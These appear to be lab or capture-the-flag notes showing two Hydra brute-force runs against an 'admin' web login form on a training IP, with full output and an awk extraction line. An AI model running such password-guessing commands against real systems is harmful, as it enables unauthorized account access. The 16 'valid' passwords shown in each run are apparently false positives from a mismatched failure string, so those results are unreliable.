### first try
`sudo hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou-50.txt 10.10.141.47 -s 80 http-post-form "/admin:user=^USER^&pass=^PASS^:F=<p>Username or password invalid</p>" -o output_hydra`
```
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-18 12:58:58
[DATA] max 16 tasks per 1 server, overall 16 tasks, 9437 login tries (l:1/p:9437), ~590 tries per task
[DATA] attacking http-post-form://10.10.141.47:80/admin:user=^USER^&pass=^PASS^:F=<p>Username or password invalid</p>
[80][http-post-form] host: 10.10.141.47   login: admin   password: 123456
[80][http-post-form] host: 10.10.141.47   login: admin   password: 12345
[80][http-post-form] host: 10.10.141.47   login: admin   password: 123456789
[80][http-post-form] host: 10.10.141.47   login: admin   password: password
[80][http-post-form] host: 10.10.141.47   login: admin   password: iloveyou
[80][http-post-form] host: 10.10.141.47   login: admin   password: princess
[80][http-post-form] host: 10.10.141.47   login: admin   password: 12345678
[80][http-post-form] host: 10.10.141.47   login: admin   password: 1234567
[80][http-post-form] host: 10.10.141.47   login: admin   password: abc123
[80][http-post-form] host: 10.10.141.47   login: admin   password: nicole
[80][http-post-form] host: 10.10.141.47   login: admin   password: babygirl
[80][http-post-form] host: 10.10.141.47   login: admin   password: daniel
[80][http-post-form] host: 10.10.141.47   login: admin   password: monkey
[80][http-post-form] host: 10.10.141.47   login: admin   password: lovely
[80][http-post-form] host: 10.10.141.47   login: admin   password: jessica
[80][http-post-form] host: 10.10.141.47   login: admin   password: 654321
1 of 1 target successfully completed, 16 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-18 12:58:59
```

`grep 'login: admin' output_hydra | awk -F"login: " '{print $2}' | awk -F" password: " '{print "login: "$1"pass: "$2}'`
```
login: admin  pass: 123456
login: admin  pass: 12345
login: admin  pass: 123456789
login: admin  pass: password
login: admin  pass: iloveyou
login: admin  pass: princess
login: admin  pass: 12345678
login: admin  pass: 1234567
login: admin  pass: abc123
login: admin  pass: nicole
login: admin  pass: babygirl
login: admin  pass: daniel
login: admin  pass: monkey
login: admin  pass: lovely
login: admin  pass: jessica
login: admin  pass: 654321
```
### second try
2022-09-20 17:32
`sudo hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt 10.10.13.234 -s 80 http-post-form "/admin:user=^USER^&pass=^PASS^:F=<p>Username or password invalid</p>" -o output_hydra`
```
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-20 17:41:12
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://10.10.13.234:80/admin:user=^USER^&pass=^PASS^:F=<p>Username or password invalid</p>
[80][http-post-form] host: 10.10.13.234   login: admin   password: 123456
[80][http-post-form] host: 10.10.13.234   login: admin   password: 123456789
[80][http-post-form] host: 10.10.13.234   login: admin   password: 12345
[80][http-post-form] host: 10.10.13.234   login: admin   password: password
[80][http-post-form] host: 10.10.13.234   login: admin   password: iloveyou
[80][http-post-form] host: 10.10.13.234   login: admin   password: princess
[80][http-post-form] host: 10.10.13.234   login: admin   password: 1234567
[80][http-post-form] host: 10.10.13.234   login: admin   password: rockyou
[80][http-post-form] host: 10.10.13.234   login: admin   password: 12345678
[80][http-post-form] host: 10.10.13.234   login: admin   password: abc123
[80][http-post-form] host: 10.10.13.234   login: admin   password: nicole
[80][http-post-form] host: 10.10.13.234   login: admin   password: daniel
[80][http-post-form] host: 10.10.13.234   login: admin   password: babygirl
[80][http-post-form] host: 10.10.13.234   login: admin   password: monkey
[80][http-post-form] host: 10.10.13.234   login: admin   password: lovely
[80][http-post-form] host: 10.10.13.234   login: admin   password: jessica
1 of 1 target successfully completed, 16 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-20 17:41:14
```